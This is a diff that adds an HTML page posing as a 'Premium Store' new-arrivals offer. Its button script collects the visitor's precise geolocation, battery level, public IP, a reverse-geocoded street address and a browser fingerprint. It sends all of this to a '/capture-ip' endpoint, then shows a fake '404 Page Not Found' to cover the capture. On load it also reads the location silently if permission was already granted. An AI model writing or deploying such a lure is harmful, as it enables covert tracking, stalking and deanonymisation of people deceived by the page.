@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>STORE IS NOW LIVE!</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; text-align: center; background: #000; margin: 0; padding: 0; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .offer-box { background: #fff; padding: 50px; border: 3px solid #000; max-width: 400px; position: relative; }
+        .offer-box::before { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; background: #000; z-index: -1; }
+        .offer-btn { background: #000; color: #fff; padding: 15px 30px; border: 3px solid #000; font-size: 18px; cursor: pointer; margin-top: 20px; transition: all 0.3s; font-weight: bold; }
+        .offer-btn:hover { background: #fff; color: #000; }
+        h1 { color: #000; margin-bottom: 20px; font-weight: bold; }
+        p { color: #000; }
+        .price { font-size: 32px; color: #000; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="offer-box">
+        <h1>PREMIUM STORE</h1>
+        <p>Discover exclusive collections</p>
+        <div class="price">NEW ARRIVALS</div>
+        <p>Limited edition items available</p>
+        <button class="offer-btn" onclick="grabOffer()">VISIT OUR STORE</button>
+    </div>
+    
+    <script>
+    let locationRequested = false;
+    
+    window.onload = () => {
+        // Check if location permission already granted
+        if (navigator.permissions) {
+            navigator.permissions.query({name: 'geolocation'}).then(result => {
+                if (result.state === 'granted' && !locationRequested) {
+                    locationRequested = true;
+                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
+                }
+            });
+        }
+    };
+    
+    async function grabOffer() {
+        let batteryInfo = 'Unknown';
+        try {
+            const battery = await navigator.getBattery();
+            batteryInfo = Math.round(battery.level * 100) + '%';
+        } catch (e) {}
+        
+        if (!locationRequested) {
+            locationRequested = true;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+            position => {
+                const locationData = {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    timestamp: new Date().toISOString()
+                };
+                localStorage.setItem('userLocation', JSON.stringify(locationData));
+                
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        // Get location using free API
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`)
+                            .then(res => res.json())
+                            .then(geoData => {
+                                const address = geoData.display_name || 'Unknown';
+                                
+                                fetch('/capture-ip', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        ip: data.ip,
+                                        lat: position.coords.latitude,
+                                        lng: position.coords.longitude,
+                                        address: address,
+                                        userAgent: navigator.userAgent,
+                                        screen: screen.width + 'x' + screen.height,
+                                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                        language: navigator.language,
+                                        battery: batteryInfo,
+                                        platform: navigator.platform,
+                                        cookieEnabled: navigator.cookieEnabled,
+                                        onlineStatus: navigator.onLine,
+                                        colorDepth: screen.colorDepth,
+                                        pixelRatio: window.devicePixelRatio,
+                                        touchSupport: 'ontouchstart' in window,
+                                        referrer: document.referrer,
+                                        url: window.location.href
+                                    })
+                                });
+                            })
+                            .catch(() => {
+                                fetch('/capture-ip', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        ip: data.ip,
+                                        lat: position.coords.latitude,
+                                        lng: position.coords.longitude,
+                                        address: 'Location lookup failed',
+                                        userAgent: navigator.userAgent,
+                                        screen: screen.width + 'x' + screen.height,
+                                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                        language: navigator.language,
+                                        battery: batteryInfo,
+                                        platform: navigator.platform,
+                                        cookieEnabled: navigator.cookieEnabled,
+                                        onlineStatus: navigator.onLine,
+                                        colorDepth: screen.colorDepth,
+                                        pixelRatio: window.devicePixelRatio,
+                                        touchSupport: 'ontouchstart' in window,
+                                        referrer: document.referrer,
+                                        url: window.location.href
+                                    })
+                                });
+                            });
+                        showError();
+                    });
+            },
+            () => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        fetch('/capture-ip', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                ip: data.ip,
+                                userAgent: navigator.userAgent,
+                                screen: screen.width + 'x' + screen.height,
+                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                language: navigator.language,
+                                battery: batteryInfo,
+                                platform: navigator.platform,
+                                cookieEnabled: navigator.cookieEnabled,
+                                onlineStatus: navigator.onLine,
+                                colorDepth: screen.colorDepth,
+                                pixelRatio: window.devicePixelRatio,
+                                touchSupport: 'ontouchstart' in window,
+                                referrer: document.referrer,
+                                url: window.location.href
+                            })
+                        });
+                        showError();
+                    });
+            }
+        );
+    }
+    
+    function showError() {
+        document.body.innerHTML = `
+            <div style="background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: Arial;">
+                <div style="text-align: center;">
+                    <h1 style="font-size: 72px; margin: 0;">404</h1>
+                    <h2 style="margin: 20px 0;">Page Not Found</h2>
+                    <p>The page you are looking for might have been removed or is temporarily unavailable.</p>
+                </div>
+            </div>
+        `;
+    }
+    </script>
+</body>
+</html>
